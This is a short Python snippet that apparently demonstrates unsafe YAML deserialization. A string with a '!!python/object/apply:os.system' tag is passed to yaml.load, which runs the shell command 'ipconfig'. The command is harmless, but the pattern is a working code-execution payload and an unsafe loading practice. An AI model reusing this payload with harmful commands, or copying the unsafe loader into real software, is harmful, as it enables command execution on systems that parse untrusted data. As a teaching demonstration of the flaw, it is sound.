import yaml
document = "!!python/object/apply:os.system ['ipconfig']"
print(yaml.load(document))
